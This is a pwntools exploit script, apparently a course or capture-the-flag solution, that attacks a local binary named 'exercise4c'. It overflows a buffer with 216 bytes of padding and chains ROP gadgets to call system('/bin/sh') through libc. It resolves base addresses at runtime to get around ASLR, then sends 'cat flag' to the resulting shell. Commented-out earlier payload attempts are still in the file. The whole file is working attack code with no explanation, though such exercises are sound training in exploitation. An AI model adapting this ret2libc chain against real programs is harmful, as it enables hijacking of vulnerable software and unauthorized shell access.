#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x0000555555555250
b *0x0000555555555258
b *0x155555370410
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

ret = 0x000055555555501a
pop_rdi_ret = 0x0000555555555333 
variable = 0x00101215
variable_2 = 0x555555556008
bin_sh = 0x1555554d25aa
system_address = 0x155555370410
exit_address = 0x155555364bc0

# 216

#shellcode = b'A'*216 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_address) + p64(ret) + p64(exit_address)
##shellcode = b'cat flag;\n' + b'A'*206 + p64(ret) + p64(pop_rdi_ret) + p64(variable_2) + p64(system_address) + p64(ret) + p64(exit_address)
r = start()

e = ELF("./exercise4c")

#pause()
r.recvuntil(b"want to send:\n")
#r.sendline(b"AAAAAAAA\x0a" + b'\0'*7 + b'B'*200 + b'C'*8)
system_address = r.libc.symbols["system"]
exit_address = r.libc.symbols["exit"]
bin_sh = next(r.libc.search(b'/bin/sh\0'))
base_address = r.libs()[e.path]
e.address += base_address
rop = ROP(e)

ret = rop.ret[0]
pop_rdi_ret = rop.rdi[0]


shellcode = b'A'*216 + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh) + p64(system_address) + p64(ret) + p64(exit_address)

print(shellcode)
r.sendline(shellcode)
r.sendline(b"cat flag")
r.sendline(b"exit")
print(r.recvall())

# You can now communicate with the process, e.g.,
# r.sendline("AAAAA")
# r.recvline()

